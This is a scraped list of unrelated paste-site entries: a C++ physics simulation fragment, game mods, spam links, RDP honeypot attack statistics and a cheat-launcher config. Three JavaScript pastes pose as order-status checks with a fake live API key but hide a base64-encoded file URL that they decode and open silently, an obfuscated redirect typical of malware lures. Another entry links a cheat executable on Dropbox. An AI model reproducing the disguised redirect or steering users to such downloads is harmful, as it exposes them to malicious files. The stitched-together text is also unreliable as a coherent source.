                double theta = acos(1.0- 2.0*R1);
                double phi = 2*M_PI*R2;

                //calculating final relative velocity with random direction

                double V_rel_x = V0_rel*sin(theta)*cos(phi);
                double V_rel_y = V0_rel*sin(theta)*sin(phi);
                double V_rel_z = V0_rel*cos(theta);

                double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);

                //calculating final velocity of electron

                double V_x_1 = V_cm_x + V_rel_x * (M_n/(m_e + M_n));
                double V_y_1 = V_cm_y + V_rel_y * (M_n/(m_e + M_n));
                double V_z_1 = V_cm_z + V_rel_z * (M_n/(m_e + M_n));

                double V_1 = sqrt(V_x_1*V_x_1 + V_y_1*V_y_1 + V_z_1*V_z_1);

                //updating electron energy and velocities

                e.energy = m_e*V_1*V_1/(2.0*q);
                e.vx = V_x_1;
                e.vy = V_y_1;
                e.vz = V_z_1;

                collision_counter++;

                e.collided = true;
            }                      
        }
    }


    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    int check = 0;
    for (int i = 0; i < histo_maxwell.size(); i++){
        check += histo_maxwell[i];
        double bin_start = Emin + i*bin_width;
        file4 << i*bin_width << "" "" <<  (i*bin_width)*static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width) << ""\n""; // getting f(E)*E
    }
    std::cout << ""Total # of electrons in histo: "" << check << ""\n"";


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();
    file7.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    std::cout << ""Energies written successfuly\n"";
    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;

}"
ZBYDEV5A,Order.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 08:44:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/274/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
37qCWnEV,Market.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 08:28:52 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/857/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kBeuLneh,Download Windows 10 LTSC&Enterprise IOT,newmatrix,HTML,Friday 28th of March 2025 08:21:11 PM CDT,"مرحباً أصدقائي متابعي قناة هشام طه! 👋🎥

نظراً لسياسة يوتيوب بخصوص روابط التحميل المباشر، قمت بإضافة رابط إضافي لتسهيل عملية التنزيل. ستجدون هنا الروابط المباشرة لتحميل إصدارات Windows 10 LTSC 2021 بكل سهولة.

🔹 Windows 10 IoT Enterprise LTSC 2021
🔗 تحميل الإصدار x64 : https://drive.massgrave.dev/en-us_windows_10_iot_enterprise_ltsc_2021_x64_dvd_257ad90f.iso

🔹 Windows 10 Enterprise LTSC 2021
📌 النسخة العربية:
🔗 تحميل x64 : https://drive.massgrave.dev/ar-sa_windows_10_enterprise_ltsc_2021_x64_dvd_60bc2a7a.iso
🔗 تحميل x32 (x86) : https://drive.massgrave.dev/ar-sa_windows_10_enterprise_ltsc_2021_x86_dvd_69e2349b.iso

📌 النسخة الإنجليزية:
🔗 تحميل x64 : https://drive.massgrave.dev/en-us_windows_10_enterprise_ltsc_2021_x64_dvd_d289cf96.iso
🔗 تحميل x32 (x86) : https://drive.massgrave.dev/en-us_windows_10_enterprise_ltsc_2021_x86_dvd_9f4aa95f.iso

🔹 رابط المقال الرسمى من مايكروسوفت : https://blogs.windows.com/windowsexperience/2024/10/31/how-to-prepare-for-windows-10-end-of-support-by-moving-to-windows-11-today/

📢 لا تنسَ دعم القناة بالاشتراك وتفعيل زر الجرس 🔔 ليصلك كل جديد! 🚀💙"
bU6iiVmb,Untitled,EMILGONZA,JSON,Friday 28th of March 2025 08:18:39 PM CDT,"{
    ""superior_launcher_link"":"""",
    ""do_u_rlly_fall_on_the_bait"":""U1VQRVJJT1JWVFJBSU5FUk1UWU1YOPAS"",
    ""state"":""Allowed"",
    ""version"":""1.06"",
    ""key"":""https://www.dropbox.com/scl/fi/eml9mq9cdw6b40ve2bwl6/SuperiorVLauncher.exe?rlkey=u7q4uh4pxfik1wjtveutmx6cc&st=e8fj8tni&dl=1"",
    ""announcement"":""KiAgQnVnIGZpeGVkIGF0IHJlZ2lzdCBhIG5ldyBhY2NvdW50"",
    ""games"":{
        ""gta4"":{
            ""version"":""1.0"",
            ""changelog"":""empty"",
            ""is_compatible"":false
        },
        ""GTAVLegacy"":{
            ""version"":""1.5"",
            ""changelog"":""empty"",
            ""is_compatible"":false,
            ""id"":""230242""
        },
        ""GTAVEnhanced"":{
            ""version"":""1.3"",
            ""changelog"":""KiBOaXRyb3VzIGlzIGFkZGVkIFZlaGljbGUgT3B0aW9ucy0+Q3VycmVudCBWZWhpY2xlLT5OaXRyb3VzDQoqTml0cm91c1YyIGlzIGFkZGVkIFZlaGljbGUgT3B0aW9ucy0+Q3VycmVudCBWZWhpY2xlLT5OaXRyb3VzVjINCiogU2VhdEJlbHQgaXMgYWRkZWQgVmVoaWNsZSBPcHRpb25zLT5DdXJyZW50IFZlaGljbGUtPlNlYXRCZWx0DQoqIFZlaGljbGUgQWNyb2JhdGljcyBBZGRlZA0KXiBGaXhlZCBTcGF3biBvZiB0aGUgdmVoaWNsZQ0KXiBQbGF5ZXIgTGlzdCBkaXNwbGF5cyBvbiByZWQgdGhlIGVtcHR5IHNsb3RzDQpeIEltcHJvdmVkIFRyaWdnZXJib3QNCl4gSW1wcm92ZWQgUmFwaWQgRmlyZSwgaXRzIGNvLXdvcmtpbmcgd2l0aCB0cmlnZ2VyYm90IGFuZCBtb3JlIFdlYXBvbiBPcHRpb25zDQo="",
            ""is_compatible"":true,
            ""id"":""647777""
        },
        ""gta6"":{
            ""version"":""1.0"",
            ""changelog"":""empty"",
            ""is_compatible"":false,
            ""id"":""null""
        },
        ""rdr2"":{
            ""version"":""1.0"",
            ""changelog"":""empty"",
            ""is_compatible"":false,
            ""id"":""null""
        },
        ""driver"":{
            ""version"":""1.0"",
            ""changelog"":""empty"",
            ""is_compatible"":false,
            ""id"":""null""
        }
    }
}"
e5NcbVPC,Untitled,rodrigomaise99,JavaScript,Friday 28th of March 2025 08:13:29 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/052/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vUvmDn4w,Machine Learning with Python: The Complete Training,f0f077,Python,Friday 28th of March 2025 08:12:19 PM CDT,"Machine Learning with Python: The Complete Training
Learn the fundamentals of Machine Learning in Python for Data Science (on real prediction models)
What you will learn
Machine Learning Fundamentals with Python
The k-nearest neighbors algorithm
Creation and quality assessment of all kinds of models
Holdout and k-fold cross-validation
for more:https://cuty.io/FsiIT4C8C"
wLaMb7gs,Itemrefund.lua,Enjl,Lua,Friday 28th of March 2025 08:08:22 PM CDT,"-- * The itemrefund library refunds your powerups and mounts if you die in a level

local itemrefund = {}

SaveData.itemrefund = SaveData.itemrefund or {}

local dead = false

local function saveCharacterData(pl)
    local charIndex = pl.character
    SaveData.itemrefund[charIndex] = SaveData.itemrefund[charIndex] or {}
    local sd = SaveData.itemrefund[charIndex]
    sd.powerup = pl.powerup
    sd.reservePowerup = pl.reservePowerup
    sd.mount = pl.mount
    sd.mountColor = pl.mountColor
    sd.hp = player:mem(0x16, FIELD_WORD)
end

local function loadCharacterData(pl)
    local charIndex = pl.character
    local sd = SaveData.itemrefund[charIndex]
    if sd == nil then return end
    pl.powerup = sd.powerup or 1
    pl.reservePowerup = sd.reservePowerup or 0
    pl.mount = sd.mount or 0
    pl.mountColor = sd.mountColor or 0
    player:mem(0x16, FIELD_WORD, sd.hp or 1)
end

function itemrefund.onExitLevel()
	if not dead then
        for k,v in ipairs(Player.get()) do
            saveCharacterData(v)
        end
	end
end

function itemrefund.onCheckpoint(cp,p)
	for k,v in ipairs(Player.get()) do
        saveCharacterData(v)
    end
end

function itemrefund.onTick()
    if Level.winState() > 0 then return end
    local allDead = true
    for k,v in ipairs(Player.get()) do
        if v.deathTimer == 0 and not v:mem(0x13C, FIELD_BOOL) then
            allDead = false
            break
        end
    end
    if allDead then
        dead = true
    end
end

function itemrefund.onStart()
	for k,v in ipairs(Player.get()) do
        loadCharacterData(v)
    end
end

registerEvent(itemrefund, ""onStart"")
if not isOverworld then
    registerEvent(itemrefund, ""onTick"")
    registerEvent(itemrefund, ""onCheckpoint"")
    registerEvent(itemrefund, ""onExitLevel"")
end

return itemrefund"
23H6Ddwm,Machine Learning with Python: The Complete Training,f0f077,Python,Friday 28th of March 2025 07:59:59 PM CDT,"Machine Learning with Python: The Complete Training
Learn the fundamentals of Machine Learning in Python for Data Science (on real prediction models)
Machine Learning Fundamentals with Python
The k-nearest neighbors algorithm
Creation and quality assessment of all kinds of models
Holdout and k-fold cross-validation
for more:https://cuty.io/FsiIT4C8C"
pSfQRCbi,Deep Learning with TensorFlow and Keras | Python MasterClass,f0f077,Python,Friday 28th of March 2025 07:38:35 PM CDT,"Deep Learning with TensorFlow and Keras | Python MasterClass
Learn how to use Python for Deep Learning (and Machine Learning) with Google's TensorFlow 2 and the Keras API!
What you will learn
The theory behind Machine Learning and Deep Learning
Using TensorFlow 2.x for Deep Learning
Leverage the Keras API to quickly build deep learning models running on TensorFlow 2
Building Artificial Neural Networks (ANNs)
for more:https://cuty.io/iU3d8i1yT"
ZkWLxdQq,Python for Data Science: The Ultimate Course (+52h),f0f077,Python,Friday 28th of March 2025 07:30:09 PM CDT,"Python for Data Science: The Ultimate Course (+52h)
In this course: Data Science, Data analysis, Data Engineering, Machine learning, Webscraping, Data visualization
What you will learn
Python fundamentals (creating loops, writing functions, OOP, algorithms)
Data Analysis (data cleaning, data modeling, data visualization with Numpy, Pandas, Seaborn, Plotly)
for more:https://cuty.io/D95zFr"
bQydL0kh,Python Developer | Complete Training 2025,f0f077,Python,Friday 28th of March 2025 07:24:53 PM CDT,"Python Developer | Complete Training 2025
Learn Python from scratch and create all types of projects: Websites, Apps, Games, Scripts, Ethical Hacking, AI
What you will learn
Learn programming from scratch
Get a solid foundation in Python
Know how to create complete projects from A to Z (and be able to share them with the whole world)
Learn to code faster with AI
for more:https://cuty.io/mkBw4AujzSw"
RPKf4zv0,2025-03-27_stats.json,rdp_snitch,JSON,Friday 28th of March 2025 07:18:36 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 104796,
    ""156.146.57.51"": 27051,
    ""156.146.57.186"": 10167,
    ""150.95.89.149"": 12975,
    ""156.146.57.52"": 12993,
    ""156.146.57.110"": 51945,
    ""156.146.57.174"": 12993,
    ""146.190.105.191"": 2100,
    ""106.14.144.233"": 429,
    ""185.7.214.81"": 24,
    ""92.255.57.86"": 24,
    ""188.166.250.11"": 6,
    ""92.255.85.59"": 27,
    ""198.235.24.221"": 9,
    ""185.196.10.51"": 3,
    ""185.42.12.5"": 12,
    ""45.227.254.151"": 6,
    ""92.255.57.11"": 6,
    ""185.147.124.165"": 9,
    ""88.214.25.125"": 12,
    ""165.140.242.48"": 3,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""47.121.132.191"": 9,
    ""198.235.24.158"": 9,
    ""45.227.254.130"": 9,
    ""58.218.199.219"": 15,
    ""147.185.132.144"": 9,
    ""165.154.33.72"": 3,
    ""167.94.146.62"": 3,
    ""198.235.24.58"": 9,
    ""45.227.254.155"": 6
  },
  ""asn"": {
    ""AS60068"": 104796,
    ""AS212238"": 115149,
    ""AS135161"": 12975,
    ""AS14061"": 2106,
    ""AS37963"": 438,
    ""AS207566"": 81,
    ""AS396982"": 36,
    ""AS42624"": 3,
    ""AS59425"": 12,
    ""AS267784"": 21,
    ""AS49505"": 9,
    ""AS35042"": 12,
    ""AS203380"": 3,
    ""AS208046"": 9,
    ""AS213438"": 9,
    ""AS4134"": 15,
    ""AS135377"": 3,
    ""AS398705"": 3
  },
  ""isp"": {
    ""DataCamp Limited"": 104796,
    ""Datacamp Limited"": 115149,
    ""GMO-Z.COM PTE. LTD."": 12975,
    ""DigitalOcean, LLC"": 2106,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""Chang Way Technologies Co. Limited"": 93,
    ""Google LLC"": 36,
    ""Global-Data System IT Corporation"": 3,
    ""Flyservers S.A."": 21,
    ""JSC Selectel"": 9,
    ""NOC EMAIL: noc@one-host.net"": 12,
    ""DA International Group Ltd."": 3,
    ""ColocationX Ltd."": 9,
    ""ColocaTel Inc."": 9,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 9,
    ""Chinanet"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""Cdn77 SGP"": 104796,
    ""Datacamp Limited"": 115149,
    ""Zcom Thai"": 12975,
    ""DigitalOcean, LLC"": 2100,
    ""Aliyun Computing Co., LTD"": 429,
    ""Chang Way Technologies Co. Limited"": 81,
    ""Digitalocean"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Global-Data System IT Corporation"": 3,
    ""Horizon LLC"": 12,
    ""Xwin Universal LTD"": 21,
    ""Almira LLC"": 9,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""AlphaVPS LLC"": 3,
    ""ColocationX Ltd"": 9,
    ""ColocaTel Inc"": 9,
    ""Alibaba.com LLC"": 9,
    ""Chinanet JS"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""North West"": 219945,
    ""Tokyo"": 12975,
    ""South West"": 2106,
    ""Shanghai"": 429,
    ""Moscow"": 102,
    ""California"": 36,
    ""Bern"": 3,
    ""Vilnius"": 21,
    ""Kowloon City"": 12,
    ""New York"": 3,
    ""Virginia"": 9,
    ""North Holland"": 9,
    ""Guangdong"": 9,
    ""Jiangsu"": 15,
    ""Metro Manila"": 3,
    ""Hesse"": 3
  },
  ""country"": {
    ""Singapore"": 222051,
    ""Japan"": 12975,
    ""China"": 453,
    ""Russia"": 102,
    ""United States"": 48,
    ""Switzerland"": 3,
    ""Lithuania"": 21,
    ""Hong Kong"": 12,
    ""The Netherlands"": 9,
    ""Philippines"": 3,
    ""Germany"": 3
  },
  ""account"": {
    ""hello"": 235482,
    ""Administr"": 81,
    ""dMyvHqbTU"": 3,
    ""kxhfrL"": 3,
    ""uilNGI"": 3,
    ""(empty)"": 6,
    ""Test"": 36,
    ""Domain"": 36,
    ""nYDxTyrJG"": 3,
    ""nviMZm"": 3,
    ""HWMrzF"": 3,
    ""IjEZbYYrE"": 3,
    ""yZYeAM"": 3,
    ""djdDqu"": 3,
    ""Administrator"": 3,
    ""NgbrwOusw"": 3,
    ""oHCnXw"": 3,
    ""SBUubS"": 3
  },
  ""keyboard"": {
    ""Unknown"": 235680
  },
  ""client_build"": {
    ""Unknown"": 235680
  },
  ""client_name"": {
    ""Unknown"": 235680
  },
  ""ip_type"": {
    ""hosting & proxy"": 222474,
    ""hosting"": 13041,
    ""proxy"": 108,
    ""Unknown"": 57
  }
}"
aJN7EdBU,2025-03-27_stats.json,rdp_snitch,JSON,Friday 28th of March 2025 07:16:22 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 104793,
    ""156.146.57.51"": 27051,
    ""156.146.57.186"": 10167,
    ""150.95.89.149"": 12975,
    ""156.146.57.52"": 12993,
    ""156.146.57.110"": 51945,
    ""156.146.57.174"": 12993,
    ""146.190.105.191"": 2100,
    ""106.14.144.233"": 429,
    ""185.7.214.81"": 24,
    ""92.255.57.86"": 24,
    ""188.166.250.11"": 6,
    ""92.255.85.59"": 27,
    ""198.235.24.221"": 9,
    ""185.196.10.51"": 3,
    ""185.42.12.5"": 12,
    ""45.227.254.151"": 6,
    ""92.255.57.11"": 6,
    ""185.147.124.165"": 9,
    ""88.214.25.125"": 12,
    ""165.140.242.48"": 3,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""47.121.132.191"": 9,
    ""198.235.24.158"": 9,
    ""45.227.254.130"": 9,
    ""58.218.199.219"": 15,
    ""147.185.132.144"": 9,
    ""165.154.33.72"": 3,
    ""167.94.146.62"": 3,
    ""198.235.24.58"": 9,
    ""45.227.254.155"": 6
  },
  ""asn"": {
    ""AS60068"": 104793,
    ""AS212238"": 115149,
    ""AS135161"": 12975,
    ""AS14061"": 2106,
    ""AS37963"": 438,
    ""AS207566"": 81,
    ""AS396982"": 36,
    ""AS42624"": 3,
    ""AS59425"": 12,
    ""AS267784"": 21,
    ""AS49505"": 9,
    ""AS35042"": 12,
    ""AS203380"": 3,
    ""AS208046"": 9,
    ""AS213438"": 9,
    ""AS4134"": 15,
    ""AS135377"": 3,
    ""AS398705"": 3
  },
  ""isp"": {
    ""DataCamp Limited"": 104793,
    ""Datacamp Limited"": 115149,
    ""GMO-Z.COM PTE. LTD."": 12975,
    ""DigitalOcean, LLC"": 2106,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""Chang Way Technologies Co. Limited"": 93,
    ""Google LLC"": 36,
    ""Global-Data System IT Corporation"": 3,
    ""Flyservers S.A."": 21,
    ""JSC Selectel"": 9,
    ""NOC EMAIL: noc@one-host.net"": 12,
    ""DA International Group Ltd."": 3,
    ""ColocationX Ltd."": 9,
    ""ColocaTel Inc."": 9,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 9,
    ""Chinanet"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""Cdn77 SGP"": 104793,
    ""Datacamp Limited"": 115149,
    ""Zcom Thai"": 12975,
    ""DigitalOcean, LLC"": 2100,
    ""Aliyun Computing Co., LTD"": 429,
    ""Chang Way Technologies Co. Limited"": 81,
    ""Digitalocean"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Global-Data System IT Corporation"": 3,
    ""Horizon LLC"": 12,
    ""Xwin Universal LTD"": 21,
    ""Almira LLC"": 9,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""AlphaVPS LLC"": 3,
    ""ColocationX Ltd"": 9,
    ""ColocaTel Inc"": 9,
    ""Alibaba.com LLC"": 9,
    ""Chinanet JS"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""North West"": 219942,
    ""Tokyo"": 12975,
    ""South West"": 2106,
    ""Shanghai"": 429,
    ""Moscow"": 102,
    ""California"": 36,
    ""Bern"": 3,
    ""Vilnius"": 21,
    ""Kowloon City"": 12,
    ""New York"": 3,
    ""Virginia"": 9,
    ""North Holland"": 9,
    ""Guangdong"": 9,
    ""Jiangsu"": 15,
    ""Metro Manila"": 3,
    ""Hesse"": 3
  },
  ""country"": {
    ""Singapore"": 222048,
    ""Japan"": 12975,
    ""China"": 453,
    ""Russia"": 102,
    ""United States"": 48,
    ""Switzerland"": 3,
    ""Lithuania"": 21,
    ""Hong Kong"": 12,
    ""The Netherlands"": 9,
    ""Philippines"": 3,
    ""Germany"": 3
  },
  ""account"": {
    ""hello"": 235479,
    ""Administr"": 81,
    ""dMyvHqbTU"": 3,
    ""kxhfrL"": 3,
    ""uilNGI"": 3,
    ""(empty)"": 6,
    ""Test"": 36,
    ""Domain"": 36,
    ""nYDxTyrJG"": 3,
    ""nviMZm"": 3,
    ""HWMrzF"": 3,
    ""IjEZbYYrE"": 3,
    ""yZYeAM"": 3,
    ""djdDqu"": 3,
    ""Administrator"": 3,
    ""NgbrwOusw"": 3,
    ""oHCnXw"": 3,
    ""SBUubS"": 3
  },
  ""keyboard"": {
    ""Unknown"": 235677
  },
  ""client_build"": {
    ""Unknown"": 235677
  },
  ""client_name"": {
    ""Unknown"": 235677
  },
  ""ip_type"": {
    ""hosting & proxy"": 222471,
    ""hosting"": 13041,
    ""proxy"": 108,
    ""Unknown"": 57
  }
}"
df6MTAmb,2025-03-27_stats.json,rdp_snitch,JSON,Friday 28th of March 2025 07:15:18 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 104790,
    ""156.146.57.51"": 27051,
    ""156.146.57.186"": 10167,
    ""150.95.89.149"": 12975,
    ""156.146.57.52"": 12993,
    ""156.146.57.110"": 51945,
    ""156.146.57.174"": 12993,
    ""146.190.105.191"": 2100,
    ""106.14.144.233"": 429,
    ""185.7.214.81"": 24,
    ""92.255.57.86"": 24,
    ""188.166.250.11"": 6,
    ""92.255.85.59"": 27,
    ""198.235.24.221"": 9,
    ""185.196.10.51"": 3,
    ""185.42.12.5"": 12,
    ""45.227.254.151"": 6,
    ""92.255.57.11"": 6,
    ""185.147.124.165"": 9,
    ""88.214.25.125"": 12,
    ""165.140.242.48"": 3,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""47.121.132.191"": 9,
    ""198.235.24.158"": 9,
    ""45.227.254.130"": 9,
    ""58.218.199.219"": 15,
    ""147.185.132.144"": 9,
    ""165.154.33.72"": 3,
    ""167.94.146.62"": 3,
    ""198.235.24.58"": 9,
    ""45.227.254.155"": 6
  },
  ""asn"": {
    ""AS60068"": 104790,
    ""AS212238"": 115149,
    ""AS135161"": 12975,
    ""AS14061"": 2106,
    ""AS37963"": 438,
    ""AS207566"": 81,
    ""AS396982"": 36,
    ""AS42624"": 3,
    ""AS59425"": 12,
    ""AS267784"": 21,
    ""AS49505"": 9,
    ""AS35042"": 12,
    ""AS203380"": 3,
    ""AS208046"": 9,
    ""AS213438"": 9,
    ""AS4134"": 15,
    ""AS135377"": 3,
    ""AS398705"": 3
  },
  ""isp"": {
    ""DataCamp Limited"": 104790,
    ""Datacamp Limited"": 115149,
    ""GMO-Z.COM PTE. LTD."": 12975,
    ""DigitalOcean, LLC"": 2106,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""Chang Way Technologies Co. Limited"": 93,
    ""Google LLC"": 36,
    ""Global-Data System IT Corporation"": 3,
    ""Flyservers S.A."": 21,
    ""JSC Selectel"": 9,
    ""NOC EMAIL: noc@one-host.net"": 12,
    ""DA International Group Ltd."": 3,
    ""ColocationX Ltd."": 9,
    ""ColocaTel Inc."": 9,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 9,
    ""Chinanet"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""Cdn77 SGP"": 104790,
    ""Datacamp Limited"": 115149,
    ""Zcom Thai"": 12975,
    ""DigitalOcean, LLC"": 2100,
    ""Aliyun Computing Co., LTD"": 429,
    ""Chang Way Technologies Co. Limited"": 81,
    ""Digitalocean"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Global-Data System IT Corporation"": 3,
    ""Horizon LLC"": 12,
    ""Xwin Universal LTD"": 21,
    ""Almira LLC"": 9,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""AlphaVPS LLC"": 3,
    ""ColocationX Ltd"": 9,
    ""ColocaTel Inc"": 9,
    ""Alibaba.com LLC"": 9,
    ""Chinanet JS"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""North West"": 219939,
    ""Tokyo"": 12975,
    ""South West"": 2106,
    ""Shanghai"": 429,
    ""Moscow"": 102,
    ""California"": 36,
    ""Bern"": 3,
    ""Vilnius"": 21,
    ""Kowloon City"": 12,
    ""New York"": 3,
    ""Virginia"": 9,
    ""North Holland"": 9,
    ""Guangdong"": 9,
    ""Jiangsu"": 15,
    ""Metro Manila"": 3,
    ""Hesse"": 3
  },
  ""country"": {
    ""Singapore"": 222045,
    ""Japan"": 12975,
    ""China"": 453,
    ""Russia"": 102,
    ""United States"": 48,
    ""Switzerland"": 3,
    ""Lithuania"": 21,
    ""Hong Kong"": 12,
    ""The Netherlands"": 9,
    ""Philippines"": 3,
    ""Germany"": 3
  },
  ""account"": {
    ""hello"": 235476,
    ""Administr"": 81,
    ""dMyvHqbTU"": 3,
    ""kxhfrL"": 3,
    ""uilNGI"": 3,
    ""(empty)"": 6,
    ""Test"": 36,
    ""Domain"": 36,
    ""nYDxTyrJG"": 3,
    ""nviMZm"": 3,
    ""HWMrzF"": 3,
    ""IjEZbYYrE"": 3,
    ""yZYeAM"": 3,
    ""djdDqu"": 3,
    ""Administrator"": 3,
    ""NgbrwOusw"": 3,
    ""oHCnXw"": 3,
    ""SBUubS"": 3
  },
  ""keyboard"": {
    ""Unknown"": 235674
  },
  ""client_build"": {
    ""Unknown"": 235674
  },
  ""client_name"": {
    ""Unknown"": 235674
  },
  ""ip_type"": {
    ""hosting & proxy"": 222468,
    ""hosting"": 13041,
    ""proxy"": 108,
    ""Unknown"": 57
  }
}"
3VyHa5GZ,Sans,enzo_gamer1e2n3z0,Lua,Friday 28th of March 2025 06:39:34 PM CDT,"-- Created by Nebula_Zorua --
-- Sans Curse (A Curse of Light) --
-- Custom Arcane Adventures Magic --
-- Wielder: Everybody (Released) --
-- Why i did make this --
-- I don't even LIKE undertale --

-- Discord: Nebula the Zorua#6969
-- Youtube: https://www.youtube.com/channel/UCo9oU9dCw8jnuVLuy4_SATA

-- You can change the Magic Circle n stuff down under Customization, at MagicVariant --

HumanDied = false
local CountSCIFIMOVIELOL = 1
function SCIFIMOVIELOL(Part0,Part1,Position,Angle)
	local AlignPos = Instance.new('AlignPosition', Part1); AlignPos.Name = ""AliP_""..CountSCIFIMOVIELOL
	AlignPos.ApplyAtCenterOfMass = true;
	AlignPos.MaxForce = 5772000--67752;
	AlignPos.MaxVelocity = math.huge/9e110;
	AlignPos.ReactionForceEnabled = false;
	AlignPos.Responsiveness = 200;
	AlignPos.RigidityEnabled = false;
	local AlignOri = Instance.new('AlignOrientation', Part1); AlignOri.Name = ""AliO_""..CountSCIFIMOVIELOL
	AlignOri.MaxAngularVelocity = math.huge/9e110;
	AlignOri.MaxTorque = 5772000
	AlignOri.PrimaryAxisOnly = false;
	AlignOri.ReactionTorqueEnabled = false;
	AlignOri.Responsiveness = 200;
	AlignOri.RigidityEnabled = false;
	local AttachmentA=Instance.new('Attachment',Part1); AttachmentA.Name = ""Ath_""..CountSCIFIMOVIELOL
	local AttachmentB=Instance.new('Attachment',Part0); AttachmentB.Name = ""Ath_""..CountSCIFIMOVIELOL
	AttachmentA.Orientation = Angle or Vector3.new(0,0,0)
	AttachmentA.Position = Position or Vector3.new(0,0,0)
	AlignPos.Attachment1 = AttachmentA;
	AlignPos.Attachment0 = AttachmentB;
	AlignOri.Attachment1 = AttachmentA;
	AlignOri.Attachment0 = AttachmentB;
